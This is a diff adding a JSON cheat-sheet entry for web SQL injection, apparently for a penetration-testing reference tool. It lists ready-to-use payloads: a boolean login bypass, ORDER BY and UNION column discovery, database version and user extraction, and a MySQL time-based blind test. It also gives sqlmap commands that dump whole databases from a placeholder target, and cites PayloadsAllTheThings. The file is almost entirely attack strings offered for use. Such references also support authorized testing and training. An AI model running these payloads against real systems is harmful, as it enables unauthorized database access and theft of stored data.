@@ -1,0 +1,39 @@
+{
+  "category": "Web – SQL Injection",
+  "description": "Most-used SQLi payloads & sqlmap starters",
+  "cheats": [
+    {
+      "title": "Login bypass (Boolean)",
+      "content": "' OR 1=1-- -"
+    },
+    {
+      "title": "Determine column count (ORDER BY)",
+      "content": "' ORDER BY 1-- \n' ORDER BY 2-- …"
+    },
+    {
+      "title": "UNION column discovery",
+      "content": "' UNION SELECT NULL,NULL-- -"
+    },
+    {
+      "title": "Extract DB version + user",
+      "content": "' UNION SELECT @@version,user()-- -"
+    },
+    {
+      "title": "Time-based blind (MySQL)",
+      "content": "' OR IF(1=1, SLEEP(5),0)-- -"
+    },
+    {
+      "title": "sqlmap GET",
+      "content": "sqlmap -u \"http://<TARGET>/item.php?id=1\" --batch --dump-all"
+    },
+    {
+      "title": "sqlmap POST (login form)",
+      "content": "sqlmap -r login.req --batch --level 3 --risk 2 --dump"
+    },
+    {
+      "title": "Source",
+      "content": "PayloadAllTheThings SQLi",
+      "source": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
+    }
+  ]
+}
